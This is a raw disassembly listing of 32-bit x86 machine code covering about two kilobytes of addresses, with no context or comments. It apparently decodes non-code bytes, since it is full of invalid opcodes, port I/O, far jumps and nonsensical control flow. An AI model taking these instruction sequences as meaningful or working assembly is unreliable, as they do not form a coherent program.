  412c38:	(bad)  [ebx]
  412c3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c3b:	fsub   QWORD PTR [ebx-0x792818b9]
  412c41:	push   esp
  412c42:	jmp    0x1c0d:0xcdbed49c
  412c49:	push   DWORD PTR [edx+ebx*8-0x315f1bef]
  412c50:	outs   dx,DWORD PTR ds:[esi]
  412c51:	mov    ecx,0x7b4bd300
  412c56:	cmp    esi,DWORD PTR [eax+0x5077a9c6]
  412c5c:	mov    ecx,esi
  412c5e:	inc    esi
  412c5f:	jb     0x412c8e
  412c61:	sub    ebp,ecx
  412c63:	mov    al,0x9d
  412c65:	xchg   esi,eax
  412c66:	jmp    0x5c19752
  412c6b:	imul   BYTE PTR [edx]
  412c6d:	pop    ebx
  412c6e:	clc    
  412c6f:	pop    ebx
  412c70:	mov    edi,DWORD PTR [ebp+0x2dcf3880]
  412c76:	pop    ds
  412c77:	in     eax,dx
  412c78:	lods   al,BYTE PTR ds:[esi]
  412c79:	jg     0x412c2a
  412c7b:	inc    ecx
  412c7c:	sbb    DWORD PTR [edx+0x6d9ac2c7],0x20
  412c83:	lea    ebp,[eax]
  412c85:	sbb    BYTE PTR [esi+0x56870f3d],ch
  412c8b:	mov    esi,0x74c2f005
  412c90:	int    0xdc
  412c92:	js     0x412cc3
  412c94:	mov    esp,0x9c7e0498
  412c99:	popa   
  412c9a:	rol    BYTE PTR [ebx+0x70711d2c],cl
  412ca0:	or     bh,ch
  412ca2:	scas   eax,DWORD PTR es:[edi]
  412ca3:	jo     0x412cd0
  412ca5:	push   ebp
  412ca6:	aam    0xa6
  412ca8:	add    edi,esi
  412caa:	mov    cl,0x50
  412cac:	mov    al,ds:0xe0a158ed
  412cb1:	dec    eax
  412cb2:	cmp    cl,BYTE PTR cs:0x476cacd3
  412cb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cba:	cmc    
  412cbb:	stos   DWORD PTR es:[edi],eax
  412cbc:	or     al,0x47
  412cbe:	pop    esi
  412cbf:	and    cl,dl
  412cc1:	mov    ds:0xb0af5c43,eax
  412cc6:	je     0x412c7e
  412cc8:	aam    0xde
  412cca:	lock fucom st(2)
  412ccd:	push   esp
  412cce:	xor    dl,cl
  412cd0:	arpl   WORD PTR [edx-0x71c9f3a3],bx
  412cd6:	jne    0x412c9e
  412cd8:	(bad)  
  412cd9:	(bad)  
  412cda:	mov    edx,0xe99f08ca
  412cdf:	sub    bh,al
  412ce1:	cwde   
  412ce2:	sbb    edi,ebp
  412ce4:	cmp    al,0x6b
  412ce6:	sub    ecx,DWORD PTR [eax-0x55]
  412ce9:	in     eax,dx
  412cea:	fnstsw WORD PTR [ebp-0x5bcb6786]
  412cf0:	ja     0x412cef
  412cf2:	sub    eax,0x5c728312
  412cf7:	and    al,0x7
  412cf9:	pop    esp
  412cfa:	xchg   esi,eax
  412cfb:	sbb    al,dl
  412cfd:	outs   dx,BYTE PTR ds:[esi]
  412cfe:	cmp    cl,BYTE PTR [edi-0x2c218521]
  412d04:	out    dx,al
  412d05:	xor    al,0xb4
  412d07:	xor    BYTE PTR [ecx+edx*4],al
  412d0a:	or     DWORD PTR [eax-0x5e],edx
  412d0d:	jae    0x412d44
  412d0f:	jmp    0x412cb2
  412d11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d12:	xchg   ebp,eax
  412d13:	fwait
  412d14:	xlat   BYTE PTR ds:[ebx]
  412d15:	xor    ah,BYTE PTR [edi]
  412d17:	push   ebx
  412d18:	fs pop eax
  412d1a:	xchg   ecx,eax
  412d1b:	nop
  412d1c:	xchg   edx,eax
  412d1d:	outs   dx,BYTE PTR ds:[esi]
  412d1e:	xor    eax,0xf0ac3d3
  412d23:	mov    eax,ds:0xa88db4f6
  412d28:	dec    ecx
  412d29:	xchg   ecx,eax
  412d2a:	push   esi
  412d2b:	inc    esp
  412d2c:	mov    ebp,0xbd60b661
  412d31:	ret    
  412d32:	scas   eax,DWORD PTR es:[edi]
  412d33:	iret   
  412d34:	cmp    BYTE PTR [ebp+0x4e946fae],cl
  412d3a:	dec    esp
  412d3b:	gs daa 
  412d3d:	dec    eax
  412d3e:	add    eax,0xd6ee0402
  412d43:	leave  
  412d44:	into   
  412d45:	call   0xb38836c2
  412d4a:	pusha  
  412d4b:	dec    esp
  412d4c:	mov    ah,0xb3
  412d4e:	mov    dh,0x30
  412d50:	fbld   TBYTE PTR [edx+0x6a]
  412d53:	cmp    al,0x80
  412d55:	sbb    edx,DWORD PTR [esi-0xdca4ac]
  412d5b:	enter  0x28bb,0x1e
  412d5f:	popa   
  412d60:	sub    DWORD PTR [ecx+0x2c75d0f9],ebx
  412d66:	sbb    ebp,DWORD PTR [ebp+0x1b]
  412d69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d6a:	add    DWORD PTR [edi+0x26],eax
  412d6d:	adc    edi,DWORD PTR [ecx+0x42]
  412d70:	fwait
  412d71:	cmp    ecx,esi
  412d73:	cmp    DWORD PTR [ecx+0x5],0xffffffb4
  412d77:	pop    esi
  412d78:	shl    BYTE PTR [eax],1
  412d7a:	cmp    al,0xd5
  412d7c:	pop    edi
  412d7d:	add    bh,BYTE PTR [ecx+edx*1]
  412d80:	(bad)  
  412d81:	jl     0x412d8a
  412d83:	popa   
  412d84:	mov    ch,0xd4
  412d86:	mov    ebx,0x3512a186
  412d8b:	inc    ebx
  412d8c:	cmp    DWORD PTR ds:0x46990831,ebx
  412d92:	test   BYTE PTR ds:0x3f31e529,dl
  412d98:	mov    ch,BYTE PTR [esi]
  412d9a:	push   esp
  412d9b:	adc    eax,0x1e85f56f
  412da0:	jge    0x412dbb
  412da2:	push   edi
  412da3:	cmp    ebx,DWORD PTR [ecx-0xf]
  412da6:	pop    ecx
  412da7:	clc    
  412da8:	xor    DWORD PTR [ebx+esi*2-0x36bb71c7],esp
  412daf:	mov    ds:0x4f113833,al
  412db4:	xchg   ecx,eax
  412db5:	add    edx,DWORD PTR [ebp+0xaf1105d]
  412dbb:	les    eax,FWORD PTR ds:0x5867d4da
  412dc1:	mov    al,ds:0x5937487d
  412dc6:	(bad)  
  412dc7:	cmp    eax,DWORD PTR [edi-0x56]
  412dca:	loope  0x412e44
  412dcc:	repnz aas 
  412dce:	or     ebp,DWORD PTR [eax]
  412dd0:	sbb    ecx,DWORD PTR [ecx+0x43]
  412dd3:	dec    ebx
  412dd4:	push   ss
  412dd5:	dec    edx
  412dd6:	mov    DWORD PTR [eax-0x30],edx
  412dd9:	test   BYTE PTR [ecx+0x36d4ab5],ch
  412ddf:	sub    DWORD PTR [edx+eax*4+0x6b6442d6],0xb905555b
  412dea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412deb:	xchg   DWORD PTR [esi],ecx
  412ded:	int3   
  412dee:	call   0x78ba8ccd
  412df3:	mov    ebx,0xe305188a
  412df8:	dec    ecx
  412df9:	lds    esp,FWORD PTR [eax-0x2a]
  412dfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412dfd:	(bad)  
  412dfe:	retf   
  412dff:	(bad)  
  412e01:	dec    esp
  412e02:	jp     0x412dab
  412e04:	mov    ecx,0x90244ab1
  412e09:	or     al,0xfb
  412e0b:	and    eax,0xdd57fa3d
  412e10:	aam    0x58
  412e12:	sar    DWORD PTR [eax+0x37],1
  412e15:	cs inc eax
  412e17:	xor    ebx,ecx
  412e19:	xchg   ecx,eax
  412e1a:	push   ss
  412e1b:	pop    eax
  412e1c:	sbb    ah,bl
  412e1e:	push   ebx
  412e1f:	arpl   WORD PTR [ebp-0xaf69496],si
  412e25:	add    eax,0x35a846cc
  412e2a:	bound  ebp,QWORD PTR [edx+ebp*8+0x36e30788]
  412e31:	add    WORD PTR [ecx],0x24b8
  412e36:	mov    al,cs:0xb191f84c
  412e3c:	pop    ebx
  412e3d:	fld    DWORD PTR [ecx+0x2a7c0920]
  412e43:	jge    0x412e71
  412e45:	aaa    
  412e46:	imul   eax,DWORD PTR [ebp+0x1741077],0x69
  412e4d:	daa    
  412e4e:	repnz xacquire xchg BYTE PTR [ecx],ah
  412e52:	das    
  412e53:	popf   
  412e54:	mov    ds:0xabdf118e,al
  412e59:	cmc    
  412e5a:	arpl   ax,dx
  412e5c:	jae    0x412e93
  412e5e:	push   ecx
  412e5f:	leave  
  412e60:	arpl   WORD PTR [ebp+0xf],bx
  412e63:	adc    dl,BYTE PTR [edi]
  412e65:	(bad)  
  412e66:	leave  
  412e67:	popa   
  412e68:	jp     0x412ede
  412e6a:	lock mov dh,0x46
  412e6d:	dec    edi
  412e6e:	das    
  412e6f:	aad    0x89
  412e71:	xor    BYTE PTR [edi+0x39dba0c6],dl
  412e77:	push   edx
  412e78:	icebp  
  412e79:	arpl   WORD PTR [eax-0x12],ax
  412e7c:	out    dx,eax
  412e7d:	pop    edx
  412e7e:	cli    
  412e7f:	jno    0x412e3c
  412e81:	fisubr WORD PTR ds:0xf129f33a
  412e87:	shl    BYTE PTR [edi*8-0x575ea24b],1
  412e8e:	imul   edi,DWORD PTR [esi+ecx*1-0x67],0xffffffee
  412e93:	push   edi
  412e94:	xor    eax,0x1b434940
  412e99:	clc    
  412e9a:	xor    esi,DWORD PTR [ebp-0xb]
  412e9d:	add    ebx,ecx
  412e9f:	or     eax,0x88f1e72a
  412ea4:	mov    esi,0x431b8bec
  412ea9:	or     BYTE PTR [ecx+0x2],0x43
  412ead:	scas   eax,DWORD PTR es:[edi]
  412eae:	dec    esi
  412eaf:	addr16 jb 0x412efb
  412eb2:	mov    esp,0x1563f91b
  412eb7:	or     dh,ah
  412eb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412eba:	lods   eax,DWORD PTR ds:[esi]
  412ebb:	jae    0x412e48
  412ebd:	stc    
  412ebe:	jp     0x412f2f
  412ec0:	lods   eax,DWORD PTR ds:[esi]
  412ec1:	mov    DWORD PTR [ebp+eax*2+0x5ae61af4],ebx
  412ec8:	jecxz  0x412f07
  412eca:	imul   ebp,DWORD PTR [edi-0x75],0x4ed3b571
  412ed1:	repz pusha 
  412ed3:	pop    ebp
  412ed4:	pushf  
  412ed5:	aad    0x34
  412ed7:	push   ecx
  412ed8:	cld    
  412ed9:	sbb    esp,edx
  412edb:	sub    esi,DWORD PTR ds:0x3048aeb1
  412ee1:	shl    DWORD PTR [ecx+0x20],1
  412ee4:	aas    
  412ee5:	cmp    al,0xee
  412ee7:	sbb    eax,0xc7723338
  412eec:	lea    ecx,ds:0xed480ae3
  412ef2:	mov    ch,BYTE PTR [esi-0x2d]
  412ef5:	stos   DWORD PTR es:[edi],eax
  412ef6:	cdq    
  412ef7:	shl    BYTE PTR [ebx-0x2ec6bb41],cl
  412efd:	hlt    
  412efe:	imul   esi,DWORD PTR [edi+0x7e270c28],0x4f023cc9
  412f08:	xchg   esi,eax
  412f09:	jb     0x412ef2
  412f0b:	xchg   ebx,eax
  412f0c:	push   edx
  412f0d:	je     0x412f7e
  412f0f:	lea    esp,fs:[eax+edx*8-0xc]
  412f14:	add    dl,BYTE PTR [ebp+0x237ac07f]
  412f1a:	push   es
  412f1b:	jo     0x412ed8
  412f1d:	mov    al,0xe5
  412f1f:	xor    DWORD PTR [edi+0x0],0x28
  412f23:	adc    al,0x4b
  412f25:	scas   eax,DWORD PTR es:[edi]
  412f26:	inc    edx
  412f27:	mov    edi,0x17f3035a
  412f2c:	retf   
  412f2d:	push   ebp
  412f2e:	xchg   esp,eax
  412f2f:	sahf   
  412f30:	inc    esi
  412f31:	xchg   esi,eax
  412f32:	mov    edx,0x2a848c50
  412f37:	mov    al,0x9a
  412f39:	xor    eax,0xccb9a5b
  412f3e:	es push 0xffffff83
  412f41:	dec    esp
  412f42:	rcr    cl,0x2d
  412f45:	lea    ebx,[edx+edx*1]
  412f48:	(bad)  
  412f49:	out    dx,eax
  412f4a:	xor    eax,0x19593f22
  412f4f:	inc    esi
  412f50:	cmp    DWORD PTR [edi-0x7de8f420],eax
  412f56:	sub    BYTE PTR [edi+edx*8+0x7c],cl
  412f5a:	iret   
  412f5b:	bound  eax,QWORD PTR [ebp-0x7e3ae306]
  412f61:	mov    esp,0x457e088d
  412f66:	xchg   ebp,eax
  412f67:	sub    eax,0xe239d706
  412f6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f6d:	(bad)  
  412f6e:	leave  
  412f6f:	cmp    eax,0x3cfd46de
  412f74:	lds    esi,FWORD PTR [edi-0x327fc90e]
  412f7a:	shl    DWORD PTR [edx],cl
  412f7c:	mov    bh,0xc7
  412f7e:	mov    cl,0x15
  412f80:	pop    ecx
  412f81:	mov    bl,0xb
  412f83:	ss out 0x10,eax
  412f86:	inc    esp
  412f87:	js     0x412ff0
  412f89:	test   al,0x3d
  412f8b:	or     BYTE PTR [ebp+0x2d97806f],ah
  412f91:	(bad)  
  412f92:	(bad)  
  412f93:	xor    cl,BYTE PTR [ecx-0x4b]
  412f96:	push   0xffffffab
  412f98:	jno    0x412fbf
  412f9a:	xor    esi,DWORD PTR [ebx+0x19ac273d]
  412fa0:	or     al,0x2f
  412fa2:	pop    ebp
  412fa3:	jge    0x412fdf
  412fa5:	jmp    0x8475:0x59a75a47
  412fac:	add    eax,0xf1cb1a9
  412fb1:	pop    esp
  412fb2:	or     dl,BYTE PTR [ecx]
  412fb4:	jne    0x412fb9
  412fb6:	inc    esp
  412fb7:	fcomp  QWORD PTR [ebx-0x5a]
  412fba:	xchg   esp,eax
  412fbb:	(bad)  
  412fbc:	pop    eax
  412fbd:	adc    eax,0x5766344c
  412fc2:	in     eax,0x89
  412fc4:	jecxz  0x412fd4
  412fc6:	cli    
  412fc7:	add    al,0xba
  412fc9:	sbb    eax,0x7346b078
  412fce:	lock aas 
  412fd0:	sbb    ebx,DWORD PTR [eax]
  412fd2:	add    dl,0xcf
  412fd5:	xchg   edx,eax
  412fd6:	shr    bh,cl
  412fd8:	das    
  412fd9:	xchg   DWORD PTR [edx],eax
  412fdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fdc:	pop    ds
  412fdd:	test   DWORD PTR [eax-0x6],esi
  412fe0:	mov    ah,0xdc
  412fe2:	dec    ecx
  412fe3:	pop    ebx
  412fe4:	pop    ds
  412fe5:	inc    eax
  412fe6:	fbstp  TBYTE PTR [edx+0x1c]
  412fe9:	daa    
  412fea:	popf   
  412feb:	loopne 0x413046
  412fed:	retf   
  412fee:	scas   al,BYTE PTR es:[edi]
  412fef:	pop    es
  412ff0:	cmp    dh,ah
  412ff2:	or     BYTE PTR [edi],ch
  412ff4:	push   es
  412ff5:	adc    al,0xc7
  412ff7:	xchg   ebx,eax
  412ff8:	cmp    DWORD PTR [ecx+0x34a22bb9],esi
  412ffe:	jp     0xc2f5bfad
  413004:	fisubr WORD PTR [ebp+0x4a]
  413007:	xchg   edi,eax
  413008:	or     edx,DWORD PTR [ebx]
  41300a:	pop    edx
  41300b:	mul    ch
  41300d:	jmp    0xf84c8b9d
  413012:	xor    dh,cl
  413014:	sub    eax,0xb6090523
  413019:	lahf   
  41301a:	cmp    bl,al
  41301c:	lds    eax,FWORD PTR [eax-0x49]
  41301f:	mov    al,ds:0xe9f8656c
  413024:	enter  0x5535,0xae
  413028:	inc    esi
  413029:	jbe    0x413016
  41302b:	add    edi,DWORD PTR [esi+0x1c97d3a0]
  413031:	xor    ecx,DWORD PTR [eax+0x6a]
  413034:	and    al,0x6c
  413036:	cli    
  413037:	dec    edx
  413038:	fs scas eax,DWORD PTR es:[edi]
  41303a:	xchg   esi,eax
  41303b:	fmul   DWORD PTR [esi+edi*1-0x5405197]
  413042:	add    eax,0xe74da196
  413047:	inc    ecx
  413048:	popf   
  413049:	test   al,0x72
  41304b:	out    0x49,eax
  41304d:	test   al,0x46
  41304f:	enter  0xa8f5,0x2b
  413053:	dec    edx
  413054:	fidivr WORD PTR [ecx+0x7f]
  413057:	bound  edi,QWORD PTR [ebx-0x7c04b77a]
  41305d:	xchg   ebp,eax
  41305e:	dec    bl
  413060:	sahf   
  413061:	xchg   esp,eax
  413062:	jmp    FWORD PTR [ebx]
  413064:	test   al,0x11
  413066:	sub    ebp,DWORD PTR [ecx]
  413068:	ss xor eax,0xdbc49a80
  41306e:	xor    eax,0xe56448d5
  413073:	(bad)  
  413074:	and    edx,DWORD PTR [ebx+esi*2]
  413077:	inc    edx
  413078:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413079:	cmp    DWORD PTR [edx+ebx*4],edi
  41307c:	je     0x413005
  41307e:	dec    ecx
  41307f:	fnclex 
  413081:	xor    BYTE PTR [edx-0x58],ch
  413084:	mov    ecx,DWORD PTR [esp+edx*1]
  413087:	(bad)  
  413089:	iret   
  41308a:	add    al,0xe3
  41308c:	add    al,0xa2
  41308e:	pop    eax
  41308f:	xchg   cl,cl
  413091:	stos   DWORD PTR es:[edi],eax
  413092:	sub    ch,0xf6
  413095:	cmp    eax,0xf527e5ae
  41309a:	cmp    al,0xe4
  41309c:	loopne 0x4130c3
  41309e:	adc    al,dl
  4130a0:	outs   dx,DWORD PTR ds:[esi]
  4130a1:	test   al,0xa0
  4130a3:	int    0x92
  4130a5:	jmp    0x5790:0xfa0600bb
  4130ac:	and    eax,esi
  4130ae:	xor    esp,DWORD PTR [edx+0xb647e78]
  4130b4:	add    al,0x8
  4130b6:	push   0xf5e9339a
  4130bb:	out    0xc8,eax
  4130bd:	mov    ecx,0xb6b48237
  4130c2:	cmp    eax,DWORD PTR [edx-0x7403433f]
  4130c8:	sub    eax,ebx
  4130ca:	pop    ecx
  4130cb:	ins    BYTE PTR es:[edi],dx
  4130cc:	sti    
  4130cd:	push   0x5c41f6f4
  4130d2:	ins    DWORD PTR es:[edi],dx
  4130d3:	pop    ss
  4130d4:	mov    al,ds:0xa4989e87
  4130d9:	out    dx,eax
  4130da:	add    BYTE PTR [ecx+0x56],ah
  4130dd:	test   eax,0xe9261f4e
  4130e2:	mov    al,ds:0x7325356d
  4130e7:	std    
  4130e8:	outs   dx,BYTE PTR ds:[esi]
  4130e9:	jl     0x4130f6
  4130eb:	rcl    DWORD PTR [ebx-0x3f074448],0x28
  4130f2:	cmp    eax,0x3d94d482
  4130f7:	ja     0x413164
  4130f9:	inc    ebx
  4130fa:	jnp    0x413123
  4130fc:	ds adc eax,0xefc3b77e
  413102:	jmp    0x413090
  413104:	(bad)  
  413106:	dec    edx
  413107:	dec    ebp
  413108:	and    DWORD PTR [ebp+0x7a693aa9],ebp
  41310e:	push   edi
  41310f:	dec    ebx
  413110:	nop
  413111:	imul   ebx,edi,0xffffff9e
  413114:	xchg   DWORD PTR ds:0x669304c5,edi
  41311a:	out    0x13,eax
  41311c:	push   esp
  41311d:	mov    dl,0xcc
  41311f:	cmp    al,0x3d
  413121:	rol    BYTE PTR [edx-0x5b5f8bf6],1
  413127:	adc    edx,eax
  413129:	ins    BYTE PTR es:[edi],dx
  41312a:	popf   
  41312b:	out    dx,eax
  41312c:	push   es
  41312d:	scas   eax,DWORD PTR es:[edi]
  41312e:	outs   dx,DWORD PTR ds:[esi]
  41312f:	test   eax,0x7c7f448b
  413134:	test   eax,0x987d848a
  413139:	leave  
  41313a:	popa   
  41313b:	cmp    al,0xd4
  41313d:	xchg   ecx,eax
  41313e:	mov    eax,0xd8cceaa8
  413143:	mov    ah,0xd8
  413145:	daa    
  413146:	sub    eax,0xd44738c
  41314b:	inc    edi
  41314c:	jg     0x413111
  41314e:	cmp    bh,bl
  413150:	mov    esi,0x1ef616ce
  413155:	mov    ebp,0xb0d06834
  41315a:	sahf   
  41315b:	add    ebp,DWORD PTR [ebx]
  41315d:	xor    DWORD PTR [edx-0x784d7996],edi
  413163:	mov    DWORD PTR [ebx-0x4566d40d],ebx
  413169:	fiadd  DWORD PTR ds:0xc04e32e3
  41316f:	ins    DWORD PTR es:[edi],dx
  413170:	(bad)  
  413172:	jns    0x41315a
  413174:	sub    BYTE PTR [edx-0x50],ch
  413177:	mov    DWORD PTR [esi+0x26bc892d],edi
  41317d:	jns    0x4131ce
  41317f:	or     eax,0x999f74a
  413184:	sbb    eax,0xe11181c2
  413189:	jp     0x41318d
  41318b:	test   BYTE PTR [esi-0x3a4d7b57],bh
  413191:	int    0x3
  413193:	add    BYTE PTR es:[ebp+0x6b561c30],cl
  41319a:	gs out 0x6f,eax
  41319d:	sub    al,0xf9
  41319f:	int    0xd1
  4131a1:	js     0x41318e
  4131a3:	or     eax,0x2ca930cd
  4131a8:	add    dl,BYTE PTR [eax+eiz*1+0x45]
  4131ac:	test   DWORD PTR [ecx],eax
  4131ae:	scas   eax,DWORD PTR es:[edi]
  4131af:	pusha  
  4131b0:	adc    esp,DWORD PTR [ebp+0x238321ac]
  4131b6:	dec    eax
  4131b7:	jl     0x4131b0
  4131b9:	sbb    DWORD PTR [esi],edx
  4131bb:	aam    0x46
  4131bd:	inc    ebp
  4131be:	sahf   
  4131bf:	push   ds
  4131c0:	jnp    0x4131f7
  4131c2:	ins    DWORD PTR es:[edi],dx
  4131c3:	outs   dx,BYTE PTR ds:[esi]
  4131c4:	in     eax,0x1f
  4131c6:	mov    BYTE PTR [ecx-0x45],bl
  4131c9:	push   eax
  4131ca:	inc    edi
  4131cb:	cwde   
  4131cc:	lahf   
  4131cd:	xor    ch,BYTE PTR [edi+0x62]
  4131d0:	inc    ebp
  4131d1:	xor    eax,0x25203530
  4131d6:	sub    DWORD PTR [esi],eax
  4131d8:	imul   ebp,DWORD PTR [edi],0xb0103399
  4131de:	push   0xc3c42c25
  4131e3:	push   es
  4131e4:	push   ss
  4131e5:	int    0x14
  4131e7:	jnp    0x4131d6
  4131e9:	jecxz  0x4131fa
  4131eb:	(bad)  
  4131ec:	scas   al,BYTE PTR es:[edi]
  4131ed:	mov    bl,0xe8
  4131ef:	fiadd  DWORD PTR [eax]
  4131f1:	in     al,0x7
  4131f3:	adc    BYTE PTR [ebp-0x2e],0xb1
  4131f7:	mov    esi,0xdb6a7554
  4131fc:	xchg   esi,eax
  4131fd:	into   
  4131fe:	sar    DWORD PTR [ebp-0x5bcf4d1],0xa0
  413205:	in     eax,0x95
  413207:	mov    BYTE PTR [ebp-0x2d1781d3],cl
  41320d:	pop    es
  41320e:	bound  edi,QWORD PTR [eax-0x3f]
  413211:	sahf   
  413212:	inc    ebp
  413213:	sbb    al,0xee
  413215:	sti    
  413216:	test   DWORD PTR [ecx],edx
  413218:	adc    ah,BYTE PTR [ebp+0x35]
  41321b:	out    dx,eax
  41321c:	mov    al,0x11
  41321e:	dec    edx
  41321f:	jle    0x413232
  413221:	or     dl,BYTE PTR [eax+edx*4+0x2f45f980]
  413228:	mov    eax,ds:0xe14dfefd
  41322d:	push   eax
  41322e:	popf   
  41322f:	iret   
  413230:	neg    edi
  413232:	ret    0xb29a
  413235:	and    cl,BYTE PTR [ebx+0x52]
  413238:	pop    ss
  413239:	fisttp WORD PTR [eax-0x7e607bf9]
  41323f:	ja     0x4131e8
  413241:	xor    eax,0xcd3dbc9d
  413246:	clc    
  413247:	or     BYTE PTR [ebp+0x766c888],cl
  41324d:	mov    ds:0x8d862823,al
  413252:	pop    edi
  413253:	leave  
  413254:	dec    DWORD PTR [ecx-0x59]
  413257:	cld    
  413258:	into   
  413259:	cmp    eax,0x57e95516
  41325e:	adc    al,0x35
  413260:	mov    ebp,DWORD PTR [edx]
  413262:	mov    al,ds:0xba236de0
  413267:	(bad)  
  413268:	outs   dx,DWORD PTR ds:[esi]
  413269:	loopne 0x4132e6
  41326b:	xchg   edx,eax
  41326c:	add    BYTE PTR [esi-0x22],cl
  41326f:	in     eax,dx
  413270:	add    al,0x6b
  413272:	js     0x4132c3
  413274:	push   0x6885e2c9
  413279:	push   ebp
  41327a:	pop    esp
  41327b:	jnp    0x413266
  41327d:	in     al,0xdf
  41327f:	cdq    
  413280:	fst    QWORD PTR [esi-0x49]
  413283:	mov    ebp,0x3750bac1
  413288:	je     0x413286
  41328a:	push   ecx
  41328b:	fwait
  41328c:	int    0xd1
  41328e:	stos   BYTE PTR es:[edi],al
  41328f:	pop    edx
  413290:	jnp    0x413228
  413292:	pop    es
  413293:	fsubr  DWORD PTR [eax+0x25d90ec0]
  413299:	in     al,dx
  41329a:	push   DWORD PTR [ebx+0xf3627cc]
  4132a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132a1:	imul   esi,DWORD PTR [ebx+0x3f],0xffffffe0
  4132a5:	mov    dl,0xc5
  4132a7:	xor    ch,bh
  4132a9:	jge    0x41328c
  4132ab:	xor    eax,0x928ae313
  4132b0:	in     eax,dx
  4132b1:	cmp    esp,DWORD PTR [esi+0x269787ce]
  4132b7:	call   0x9aafb0b4
  4132bc:	adc    BYTE PTR [edi+0x6dd77204],ah
  4132c2:	not    DWORD PTR [eax]
  4132c4:	lahf   
  4132c5:	test   al,0x4e
  4132c7:	imul   esi,DWORD PTR fs:[esi],0xfffffffc
  4132cb:	das    
  4132cc:	xlat   BYTE PTR ds:[ebx]
  4132cd:	sar    DWORD PTR [edi],cl
  4132cf:	fs push 0x17
  4132d2:	adc    al,0x12
  4132d4:	push   ds
  4132d5:	enter  0xe927,0x9
  4132d9:	mov    bl,dl
  4132db:	pop    eax
  4132dc:	dec    ebp
  4132dd:	inc    ebp
  4132de:	das    
  4132df:	out    dx,al
  4132e0:	cmp    cl,BYTE PTR [ecx+0xa]
  4132e3:	ret    
  4132e4:	call   0x564a4107
  4132e9:	out    0xbe,eax
  4132eb:	sbb    DWORD PTR [ebp+0x12d77768],esp
  4132f1:	mov    edx,0x32621614
  4132f6:	out    dx,al
  4132f7:	jmp    0xe9b7:0x23958797
  4132fe:	mov    WORD PTR [eax-0x1b],ss
  413301:	test   DWORD PTR [ebx+0x221bd320],0x3c5d2b1e
  41330b:	fs mov ecx,eax
  41330e:	mov    eax,0x9c02e763
  413313:	dec    edx
  413314:	lds    esi,FWORD PTR [edi-0x37218611]
  41331a:	mov    ebx,edx
  41331c:	add    al,0xa0
  41331e:	test   al,0xca
  413320:	imul   ebx,DWORD PTR [ebx],0xffffff88
  413323:	fwait
  413324:	call   0xa744:0xaf80dee1
  41332b:	(bad)  
  41332d:	addr16 nop
  41332f:	pop    edx
  413330:	and    dh,BYTE PTR [ebp+0x581f6c3a]
  413336:	ins    DWORD PTR es:[edi],dx
  413337:	pop    ebp
  413338:	xor    BYTE PTR [esi+0x38],0x4c
  41333c:	aad    0xa2
  41333e:	scas   eax,DWORD PTR es:[edi]
  41333f:	scas   eax,DWORD PTR es:[edi]
  413340:	inc    esp
  413341:	cwde   
  413342:	test   BYTE PTR [esp+ebx*4],dl
  413345:	xchg   edi,eax
  413346:	or     DWORD PTR [ebp+0x2ca0fa66],0x2b4dcffb
  413350:	out    0x1f,al
  413352:	jb     0x413337
  413354:	les    eax,FWORD PTR [ecx]
  413356:	mov    ?,WORD PTR [edi+0x65]
  413359:	xor    dl,BYTE PTR [ebp+0x1a]
  41335c:	rol    BYTE PTR [edx],1
  41335e:	loope  0x413336
  413360:	shl    DWORD PTR [ecx-0x4c],0x62
  413364:	(bad)  
  413365:	(bad)  
  413367:	dec    eax
  413368:	loopne 0x413315
  41336a:	fld    DWORD PTR [edi]
  41336c:	mov    esi,0xab0c36d0
  413371:	sub    al,0x5
  413373:	psubsw mm4,QWORD PTR [ecx-0x7b]
  413377:	mov    WORD PTR [edx],gs
  413379:	es mov bh,0xb
  41337c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41337d:	lods   eax,DWORD PTR ds:[esi]
  41337e:	mov    dh,0x2
  413380:	cdq    
  413381:	xchg   edi,eax
  413382:	jnp    0x4133cc
  413384:	add    al,BYTE PTR [edx]
  413386:	ficomp DWORD PTR [ebx]
  413388:	pop    ds
  413389:	sbb    BYTE PTR [ecx-0x41df7a63],dh
  41338f:	push   ebp
  413390:	scas   eax,DWORD PTR es:[edi]
  413391:	cmp    BYTE PTR [eax-0x5c19beba],dh
  413397:	cmp    eax,0x50db5eaa
  41339c:	js     0x413370
  41339e:	mov    ds:0x60b97f13,eax
  4133a3:	(bad)
  4133a6:	sub    al,0xf7
  4133a8:	adc    DWORD PTR [ebx-0x23],ecx
  4133ab:	lods   eax,DWORD PTR ds:[esi]
  4133ac:	call   0xea64:0x95e667f7
  4133b3:	ror    eax,0x64
  4133b6:	mov    cl,0xb7
  4133b8:	ret    0x75e8
  4133bb:	xchg   DWORD PTR [eax-0xca05db0],edi
  4133c1:	call   0x347:0x86c7d654
  4133c8:	sti    
  4133c9:	jl     0x4133cd
  4133cb:	popa   
  4133cc:	xlat   BYTE PTR ds:[ebx]
  4133cd:	lods   al,BYTE PTR es:[esi]
  4133cf:	adc    DWORD PTR [eax],ecx
  4133d1:	sar    BYTE PTR [edx+edi*8-0x6f926d5c],1
  4133d8:	pop    es
  4133d9:	xchg   DWORD PTR [edi+0x2b5fa4c3],edi
  4133df:	loop   0x413394
  4133e1:	pop    ebx
  4133e2:	std    
  4133e3:	cli    
  4133e4:	xor    al,BYTE PTR [ebp-0x77]
  4133e7:	scas   al,BYTE PTR es:[edi]
  4133e8:	add    BYTE PTR [ecx+0x40],0x1b
  4133ec:	push   ebp
  4133ed:	mov    dh,0xb9
  4133ef:	shl    dh,1
  4133f1:	mov    al,ds:0x297060b7
  4133f6:	sub    al,0x5c
  4133f8:	xchg   esi,eax
  4133f9:	test   al,0x96
  4133fb:	cs out dx,al
  4133fd:	repnz repnz test al,0xd3
  413401:	push   edx
  413402:	xlat   BYTE PTR ds:[ebx]
  413403:	mov    eax,ds:0x7980dcc5
  413408:	or     al,0xf
  41340a:	ret    
  41340b:	inc    eax
  41340c:	sar    DWORD PTR [esi],0xc
